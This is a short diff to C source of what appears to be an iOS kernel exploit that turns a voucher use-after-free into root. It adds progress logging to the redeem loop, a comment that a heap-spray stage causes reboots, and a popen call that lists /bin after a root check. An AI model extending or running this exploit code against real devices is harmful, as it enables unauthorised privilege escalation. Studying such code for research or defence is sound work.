@@ -322,11 +322,19 @@ stage1:
 
     cicuta_log("Stage 3: Convert uaf into pktopts uaf");
     ipc_voucher_t redeemed_voucher = IPC_VOUCHER_NULL;
+    int c = 0;
     for (uint32_t i = 1; i < 167777280; ++i)
     {
         assert(redeem_voucher(uafed_voucher, &redeemed_voucher) == KERN_SUCCESS);
+        c++;
+        if (c == 100000) {
+            cicuta_log_one(".");
+            c = 0;
+        }
     }
 
+    
+    // This step seems prone to causing reboots
     cicuta_log("Respray fake user_data_element");
     fake_element_spray_set_e_size(DATA_VOUCHER_CONTENT_SIZE);
     perform_fake_element_spray();
@@ -392,6 +400,22 @@ stage1:
     uint32_t uid = getuid();
     cicuta_log("getuid() returns %u", uid);
     cicuta_log("whoami: %s", uid == 0 ? "root" : "mobile");
+    
+    cicuta_log("Trying to run /bin/ls");
+    
+    FILE *pros;
+    char path[1035];
+    
+    pros = popen("/bin/ls","r");
+    if (pros == NULL) {
+        cicuta_log("Failed to run process");
+    } else {
+        while (fgets(path, sizeof(path), pros) != NULL) {
+            cicuta_log("%s", path);
+          }
+    }
+    pclose(pros);
+    
 
 err:
     free(redeem_racers);
